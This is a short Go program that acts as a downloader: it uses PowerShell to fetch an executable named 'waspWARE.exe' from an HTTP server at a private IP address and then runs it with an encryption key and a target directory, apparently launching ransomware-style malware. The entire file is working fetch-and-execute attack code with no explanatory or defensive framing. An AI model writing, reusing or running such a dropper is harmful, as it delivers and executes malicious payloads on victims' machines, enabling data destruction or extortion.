package main

import (
	"fmt"
	"os"
	"os/exec"
)

func main() {
	cmd := exec.Command("powershell.exe", "wget", "http://192.168.1.134:8000/waspWARE.exe", "-o", "waspWARE.exe")
	cmd.Stdout = os.Stdout
	cmd.Run()

	workingDirectory, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}

	dosyaYolu := workingDirectory + "\\waspWARE.exe"
	cmd2 := exec.Command("powershell.exe", dosyaYolu, "-key", "a3R4BOfw9nG+3he0V07WXQ==", "-dizin", "C:\\test")
	cmd2.Stdout = os.Stdout
	cmd2.Run()
}
